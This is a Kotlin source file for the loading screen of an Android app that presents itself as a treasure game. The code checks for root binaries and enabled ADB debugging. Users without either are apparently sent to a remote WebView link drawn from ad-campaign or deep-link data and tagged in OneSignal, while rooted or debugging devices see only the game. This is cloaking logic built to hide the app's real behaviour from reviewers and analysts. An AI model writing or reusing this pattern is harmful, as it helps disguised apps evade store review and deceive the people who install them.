package falling.treasur.ggamee.ui

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider
import com.onesignal.OneSignal
import falling.treasur.ggamee.R
import falling.treasur.ggamee.database.LinkDb
import falling.treasur.ggamee.database.LinkEntity
import falling.treasur.ggamee.game.StartGameActivity
import falling.treasur.ggamee.ui.view_models.LinkViewModel
import falling.treasur.ggamee.ui.view_models.LinkViewModelFactory
import falling.treasur.ggamee.util.Constants.Companion.IS_FIRST_LAUNCH
import falling.treasur.ggamee.util.Constants.Companion.PREFERENCE_KEY
import java.io.File

class LoadingScreenActivity : AppCompatActivity() {
    private lateinit var viewModel: LinkViewModel

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        val viewModelFactory = LinkViewModelFactory(application, LinkDb(applicationContext))
        viewModel =
            ViewModelProvider(this, viewModelFactory)[LinkViewModel::class.java]

        if (!checks() && tracks() != "1") {
            if (isFirstLaunch()) {
                viewModel.parsedLink.observe(this) { fullLink ->
                    viewModel.saveLinkToDb(LinkEntity(link = fullLink, flag = false))
                    sendOneSignalTag()

                    with(getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE).edit()) {
                        putBoolean(IS_FIRST_LAUNCH, false)
                        apply()
                    }
                    startWebView(fullLink)
                }
            } else {
                viewModel.getLink().observe(this) {
                    it?.let { linkEntity ->
                        if (linkEntity.flag) {
                            startWebView(linkEntity.link)
                        }
                    }
                }
            }
        } else {
            startActivity(Intent(this, StartGameActivity::class.java))
        }
    }

    private fun startWebView(link: String) {
        with(Intent(this, WebViewActivity::class.java)) {
            putExtra("link", link)
            startActivity(this)
        }
        finish()
    }

    private fun sendOneSignalTag() {
        val deepLink = viewModel.deepLink
        val campaign = viewModel.dataMap?.get("campaign").toString()
        val key = "key2"

        if (campaign == "null" && deepLink == "null") {
            OneSignal.sendTag(key, "organic")
        } else if (deepLink != "null" && deepLink != null) {
            OneSignal.sendTag(key, deepLink.replace("myapp://", "").substringBefore("/"))
        } else if (campaign != "null") {
            OneSignal.sendTag(key, campaign.substringBefore("_"))
        }
    }

    private fun isFirstLaunch(): Boolean {
        val sharePref = getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
        return if (sharePref.getBoolean(IS_FIRST_LAUNCH, true)) {
            with(sharePref.edit()) {
                putBoolean(IS_FIRST_LAUNCH, false)
                apply()
            }
            true
        } else {
            false
        }
    }

    private fun checks(): Boolean {
        val places = arrayOf(
            "/sbin/", "/system/bin/", "/system/xbin/",
            "/data/local/xbin/", "/data/local/bin/",
            "/system/sd/xbin/", "/system/bin/failsafe/",
            "/data/local/"
        )
        try {
            for (where in places) {
                if (File(where + "su").exists()) return true
            }
        } catch (ignore: Throwable) {
        }
        return false
    }

    private fun tracks(): String {
        return Settings.Global.getString(this.contentResolver, Settings.Global.ADB_ENABLED)
            ?: "null"
    }
}